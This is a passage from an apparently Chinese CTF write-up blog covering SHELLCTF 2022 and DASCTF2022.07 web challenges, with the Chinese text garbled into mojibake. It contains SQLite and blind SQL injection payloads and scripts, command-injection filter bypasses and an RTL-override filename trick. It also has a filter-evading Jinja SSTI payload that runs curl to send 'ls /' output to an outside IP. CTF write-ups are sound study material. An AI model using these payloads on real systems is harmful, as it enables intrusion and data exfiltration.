alt="img"></p><p>ä½†æ˜¯æˆ‘æƒ³ä½¿ç”¨database()ï¼Œversion()æ¥è¿›ä¸€æ­¥æµ‹è¯•çš„æ—¶å€™ï¼Œå›æ˜¾é”™è¯¯ï¼Œæ‰€ä»¥åº”è¯¥ä¸æ˜¯mysql</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855114.png" alt="img"></p><p>çœ‹å¸ˆå‚…ä»¬çš„wpæ‰çŸ¥é“æ˜¯sqliteæ³¨å…¥</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md</a></p><p>æµ‹è¯•æ•°æ®åº“ç‰ˆæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="title function_ invoke__">sqlite_version</span>()--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855115.png" alt="img"></p><p>æ³¨æ„3.30ç‰ˆæœ¬åsqlite_masteræ‰æ”¹åsqlite_schema,æ‰€ä»¥åº”è¯¥ç”¨sqlite_masterã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,sql+FROM+sqlite_master--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855116.png" alt="img"></p><p>æœ€åï¼Œä¸ç”¨åŒºåˆ†å¤§å°å†™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,content+FROM+admins--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855117.png" alt="img"></p><h2 id="ILLUSION"><a href="#ILLUSION" class="headerlink" title="ILLUSION"></a>ILLUSION</h2><p>è€ƒç‚¹ï¼šå‘½ä»¤æ³¨å…¥</p><p>å¯¹å…³é”®å‘½ä»¤æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8765/wH4t_Y0u_d1d?inn=llss</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856118.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;llss</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856119.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;ccdd ....;llss</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856120.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;ccdd ....;cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856121.png" alt="img"></p><h2 id="Doc-Holder"><a href="#Doc-Holder" class="headerlink" title="Doc Holder"></a>Doc Holder</h2><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>Can you share portable document with us which looks like it when we seet portable document with eyes but tiâ€™s not actually portable document.</p><p>More a misc problem â€¦</p><p>My Favourite move is Inferno overwrite </p><p><a href="http://20.125.142.38:8508/">http://20.125.142.38:8508</a></p><p>Alternate Link :- <a href="http://20.193.247.209:8666/">http://20.193.247.209:8666/</a></p><p>Hint â€” Challenge is all about file extension of the file that you are uploadingâ€¦.</p><p>Hint1: Think from right to left Hint2: Everything is just related to name and extension of file not content in file â€¦ Hint3: Give me file with name while when seen from eyes look like abc.pdf but its not actually pdf Hint4: Make file name â€œabc.fdpâ€ look â€œabc.pdfâ€</p></blockquote><p>ä¸å…è®¸æ–‡ä»¶ååç¼€ä¸ºpdfï¼Œä½†æ˜¯è¦è®©æœåŠ¡ç«¯è§£æä¸ºpdf</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856122.png" alt="img"></p><p><code>å®ç°çš„æ–¹æ³•æ˜¯ç”¨æ§åˆ¶å­—ç¬¦ï¼Œå°†fdpä»å³å¾€å·¦è§£æä¸ºpdf</code>(ä¸æ¸…æ¥šåŸç†ï¼Œç”¨pythonæµ‹è¯•çš„ç»“æœå¦‚ä¸‹)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="string">u&#x27;\u200f&#x27;</span>, <span class="string">u&#x27;\u202b&#x27;</span>, <span class="string">u&#x27;\u202e&#x27;</span>, <span class="string">u&#x27;\u2067&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    filename = <span class="string">&quot;sk1y.&quot;</span> + i + <span class="string">&quot;fdp&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(filename)</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856123.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://20.125.142.38:8508/&#x27;</span></span><br><span class="line">filename = <span class="string">&quot;abc.&quot;</span>+<span class="string">u&#x27;\u202e&#x27;</span>+<span class="string">&quot;fdp&quot;</span></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (filename, <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;application/pdf&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url, files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857124.png" alt="img"></p><p>åŒæ—¶åœ¨burpsuiteæµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°åœ¨æ–‡ä»¶åå‰åŠ ä¸Šå­—ç¬¦ï¼Œå¹¶ä¸”ä¸ºå•å¼•å·ï¼Œå¹¶ä¸”åé¢å«æœ‰<code>fdp</code>ï¼Œä¹Ÿå¯ä»¥æˆåŠŸ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857125.png" alt="img"></p><p>ä½†æ˜¯ç”¨åŒå¼•å·å°±ä¸è¡Œ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857126.png" alt="img"></p><p>è¿™ä¸€ç‚¹è¿˜æ˜¯ä¸å¤ªç†è§£</p><p>ä¸è¿‡éœ€è¦fdpæ‰èƒ½æˆåŠŸï¼Œä¼°è®¡ä¹Ÿæ˜¯ä»å³å¾€å·¦ä¹‹ç±»çš„åŸå› </p><h2 id="RAW-Agent"><a href="#RAW-Agent" class="headerlink" title="RAW Agent"></a>RAW Agent</h2><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>Day By Day Pollution is increasing, passing polluted environment and sum of all generation till now will take you to ultimate end.</p><p>Flag Format :- Enclose everything in shellctf{} Flag have two part :- shellctf{part1part2}</p><p>Part 1 start with :- U</p><p>Part 2 start with :- _p</p><p>Challenge url :- <a href="http://20.125.142.38:8525/">http://20.125.142.38:8525/</a></p><p>Alternate URL :- <a href="http://20.193.247.209:8777/">http://20.193.247.209:8777/</a></p><p>More Alternate URL :- <a href="http://52.66.29.74:8888/">http://52.66.29.74:8888/</a></p></blockquote><p>flagåŒ…æ‹¬ä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºUï¼Œç¬¬äºŒéƒ¨åˆ†ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºp</p><p>å°±æ˜¯ä¸ªMiscï¼Œä¸ç®¡äº†</p><h2 id="More-ILLUSION"><a href="#More-ILLUSION" class="headerlink" title="More ILLUSION"></a>More ILLUSION</h2><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>If you still not illuded, here is another potion of illusion for you. Can you survive it ?????</p><p>You can <strong>du</strong> it â€¦â€¦..</p><p>Flag format :- enclose entire thing in shellctf{}</p><ul><li><p>A - Thing you got after solving problem</p></li><li><p>B - Linux command (not entire command but specific one command that lead you to solution, ex- â€œcd .. ; ls -laâ€ was command that showed me thing which lead me to flag then special command is â€œlsâ€ and argument is â€œlaâ€)</p></li></ul><p>Example flag -</p><ul><li>Suppose I got string â€œH3re_1s_F1agâ€ from solving so my A &#x3D; H3re_1s_F1ag</li></ul><p>Some charaters are ommited complete the flag with all description above in below flag. ommited character corresponds to arguments of that you du.</p><p>After â€œH3re_1s_F1agâ€ one is special command rest are its arguments.</p><p>shellctf{H3re_1s_F1ag_xx_appaxxxx-xxxx_ah}</p><p>Challenge url :- <a href="http://20.125.142.38:8499/">http://20.125.142.38:8499/</a></p><p>Alternate URL :- <a href="http://52.66.29.74:8871/">http://52.66.29.74:8871/</a></p><p>More Alternate URL :- <a href="http://20.193.247.209:8822/">http://20.193.247.209:8822/</a></p></blockquote><p>å‚è€ƒek1ngå¸ˆå‚…çš„è§£æ³•ï¼Œä½¿ç”¨doå‘½ä»¤</p><blockquote><p>Linux du ï¼ˆè‹±æ–‡å…¨æ‹¼ï¼šdisk usageï¼‰å‘½ä»¤ç”¨äºæ˜¾ç¤ºç›®å½•æˆ–æ–‡ä»¶çš„å¤§å°ã€‚</p><p>du ä¼šæ˜¾ç¤ºæŒ‡å®šçš„ç›®å½•æˆ–æ–‡ä»¶æ‰€å ç”¨çš„ç£ç›˜ç©ºé—´ã€‚</p><p>-aæˆ–-all æ˜¾ç¤ºç›®å½•ä¸­ä¸ªåˆ«æ–‡ä»¶çš„å¤§å°ã€‚</p><p>-hæˆ–â€“human-readable ä»¥Kï¼ŒMï¼ŒGä¸ºå•ä½ï¼Œæé«˜ä¿¡æ¯çš„å¯è¯»æ€§ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;dduu --apparent-size -ah</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857127.png" alt="img"></p><p>ä½¿ç”¨<a href="https://cyberchef.org/">https://cyberchef.org/</a> è¿›è¡Œæ•´ç†</p><p>é€‰æ‹©From HTML Entity å’Œ Unescape string è¿›è¡Œæ•´ç†</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857128.png" alt="img"></p><p>é€‰æ‹©ä¸€ä¸ªå¤§å°ä¸º38çš„</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857129.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;<span class="built_in">cat</span> ./flag-------------/flag/flag/flag/flag/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857130.png" alt="img"></p><p>åŒ…ä¸Šshellctf{}å³å¯</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ‰“å›½å¤–çš„æ¯”èµ›è¿˜æ˜¯å¤ªå°‘äº†ï¼Œç»éªŒä¸å¤Ÿï¼Œæ€è·¯æ¯”è¾ƒå±€é™ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ªé¢˜ç›®çš„xssï¼Œsqliteæ³¨å…¥ç­‰ç­‰ï¼Œè¿˜è¦ç»§ç»­åŠªåŠ›å­¦</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ol><li><a href="https://ek1ng.com/SHELLCTF2022.html">https://ek1ng.com/SHELLCTF2022.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> SHELLCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2022.07èµ‹èƒ½èµ›å¤ç°</title>
      <link href="/2022/08/07/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/08/07/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF2022-07èµ‹èƒ½èµ›å¤ç°"><a href="#DASCTF2022-07èµ‹èƒ½èµ›å¤ç°" class="headerlink" title="DASCTF2022.07èµ‹èƒ½èµ›å¤ç°"></a>DASCTF2022.07èµ‹èƒ½èµ›å¤ç°</h1><p>[toc]</p><h2 id="Ez-to-getflag"><a href="#Ez-to-getflag" class="headerlink" title="Ez to getflag"></a>Ez to getflag</h2><p>ä¼šæ£€æŸ¥ä¸Šä¼ çš„æ–‡ä»¶çš„å†…å®¹ï¼Œä¸èƒ½å­˜åœ¨php,å¯ä»¥ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼Œä½†æ˜¯ä¸çŸ¥é“æ–‡ä»¶ä¸Šä¼ çš„å­˜æ”¾è·¯å¾„ã€‚</p><p>æœ¬æ¥ä»¥ä¸ºæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼ï¼ï¼</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220730174626603.png" alt="image-20220730174626603"></p><h2 id="Harddisk"><a href="#Harddisk" class="headerlink" title="Harddisk"></a>Harddisk</h2><p>fuzzï¼Œè¿‡æ»¤äº†å¾ˆå¤šçš„å…³é”®è¯</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220731131121372.png" alt="image-20220731131121372"></p><p>å…¶ä¸­å¤§æ‹¬å·å¯ä»¥ä½¿ç”¨<code>&#123;%print(......)%&#125;</code>æˆ–<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>çš„å½¢å¼æ¥ä»£æ›¿ï¼Œè€Œprintè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨åè€…</p><p>æ ¹æ®è¿‡æ»¤ä¿¡æ¯ï¼Œ<code>[]</code>ï¼Œ<code>ç‚¹</code>ï¼Œ<code>class</code>ç­‰å…³é”®è¯éƒ½è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä½¿ç”¨attrå’Œunicodeç¼–ç è¿›è¡Œç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>.__class__)%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰§è¡ŒæˆåŠŸï¼Œå›æ˜¾555</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220731180108482.png" alt="image-20220731180108482"></p><p>å› ä¸ºåªèƒ½æ ¹æ®æ˜¯å¦å›æ˜¾555æ¥åˆ¤æ–­ï¼Œç›¸å½“äºç›²æ³¨ï¼Œæ‰€ä»¥ç”¨è‡ªåŠ¨åŒ–è„šæœ¬æ¥åˆ¤æ–­å¯»æ‰¾å¯ä»¥ç”¨çš„ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>)|attr(<span class="string">&quot;__base__&quot;</span>)|attr(<span class="string">&quot;__subclasses__&quot;</span>)()|attr(<span class="string">&quot;__getitem__&quot;</span>)(xx)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;popen&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="number">132</span>)|attr(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°132</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220801104937777.png" alt="image-20220801104937777"></p><p>å› ä¸ºä¸èƒ½å›æ˜¾ï¼Œæ‰€ä»¥ä½¿ç”¨å¤–å¸¦å‘½ä»¤å®ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>)|attr(<span class="string">&quot;__base__&quot;</span>)|attr(<span class="string">&quot;__subclasses__&quot;</span>)()|attr(<span class="string">&quot;__getitem__&quot;</span>)(xx)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;curl 116.62.240.148:7011 -d &quot;</span>`ls /`<span class="string">&quot;&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)())%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="number">132</span>)|attr(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>)(<span class="string">&quot;\u0063\u0075\u0072\u006c\u0020\u0031\u0031\u0036\u002e\u0036\u0032\u002e\u0032\u0034\u0030\u002e\u0031\u0034\u0038\u003a\u0037\u0030\u0031\u0031&quot;</span>)|attr(<span class="string">&quot;\u0072\u0065\u0061\u0064&quot;</span>)())%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯é¢˜ç›®ç¯å¢ƒé—®é¢˜ï¼Œcurlæœ‰æ—¶å€™è¡Œï¼Œæœ‰æ—¶å€™ä¸è¡Œï¼Œæœ‰æ—¶å€™é”€æ¯é¶æœºä¹‹åå°±ä¼šåƒä¸‹é¢è¿™æ ·å¿½ç„¶å‡ºç°ä¸€å¤§å †çš„è¯·æ±‚ï¼ˆçœŸç¥å¥‡ï¼‰</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220801132613514.png" alt="image-20220801132613514"></p><p>è€Œåé”€æ¯åˆç”³è¯·ç¯å¢ƒå¥½å¤šæ¬¡ï¼Œå°è¯•æ— æœã€‚ã€‚ã€‚</p><h2 id="ç»å¯¹é˜²å¾¡"><a href="#ç»å¯¹é˜²å¾¡" class="headerlink" title="ç»å¯¹é˜²å¾¡"></a>ç»å¯¹é˜²å¾¡</h2><p>JSFinderï¼šæŸ¥æ‰¾éšè—åœ¨jsæ–‡ä»¶ä¸­çš„api æ¥å£å’Œæ•æ„Ÿç›®å½•ï¼Œä»¥åŠä¸€äº›å­åŸŸå</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -u http://badcc3c9-4df2-4c54-a430-bc7c8b122353.node4.buuoj.cn:<span class="number">81</span>/</span><br></pre></td></tr></table></figure><p>æ‰«æç»“æœ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220801234847743.png" alt="image-20220801234847743"></p><p>è®¿é—®SUPPERAPI.phpï¼ŒæŸ¥çœ‹æºä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/[`~!@#$%^&amp;*()_+&lt;&gt;?:&quot;&#123;&#125;,.\/;&#x27;[\]]/im</span>;</span><br><span class="line">        <span class="keyword">if</span> (reg.<span class="title function_">test</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&quot;id&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;æç¤ºï¼šæ‚¨è¾“å…¥çš„ä¿¡æ¯å«æœ‰éæ³•å­—ç¬¦ï¼&quot;</span>);</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;/&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">check</span>()</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>window.location.search.substring(1)</code>åŠŸèƒ½ä¸ºè·å–å½“å‰é¡µé¢GETæ–¹å¼è¯·æ±‚<code>?åçš„æŒ‡å®šå‚æ•°</code></p><p>è¿™æ®µä»£ç çš„æ„æ€å¤§æ¦‚ä¸ºä¼ é€’è°ƒç”¨getQueryVariableï¼Œå‚æ•°ä¸ºidï¼Œè¯¥å‡½æ•°ä¸­è·å–<code>?åçš„è¯·æ±‚å‚æ•°</code>ï¼Œç”¨<code>&amp;</code>åˆ†å‰²ï¼Œç”¨<code>=</code>åˆ†å‰²ï¼Œå–å‰è€…ï¼Œä¹Ÿå°±æ˜¯å˜é‡åï¼Œå¹¶å°†è¯¥å˜é‡åå’Œ<code>id</code>è¿›è¡Œå¯¹æ¯”ï¼ŒæˆåŠŸåˆ™è¿”å›<code>pair[1]</code></p><p>æ‰€ä»¥è¦ä¼ é€’å˜é‡idï¼Œä½†æ˜¯æ¥ä¸‹æ¥æ€ä¹ˆåˆ©ç”¨ä¸æ¸…æ¥šï¼Œæ ¹æ®å®˜æ–¹wpï¼Œè¿™é‡Œç”¨idè¿›è¡Œsqlç›²æ³¨ï¼ˆé˜²æŠ¤ä¸ç”¨ç®¡ï¼Œæ˜¯å‰ç«¯çš„é˜²æŠ¤ï¼Œç›´æ¥å†™è„šæœ¬å°±å¯ä»¥ï¼‰</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220802001640636.png" alt="image-20220802001640636"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://badcc3c9-4df2-4c54-a430-bc7c8b122353.node4.buuoj.cn:81/SUPPERAPI.php?&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;j=&quot;</span>+<span class="built_in">str</span>(j))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr(database(),&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;,1))=&quot;</span>+<span class="built_in">str</span>(i)     <span class="comment"># # çˆ†åº“å  ctf</span></span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(i)   <span class="comment"># çˆ†è¡¨å users</span></span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(i)  <span 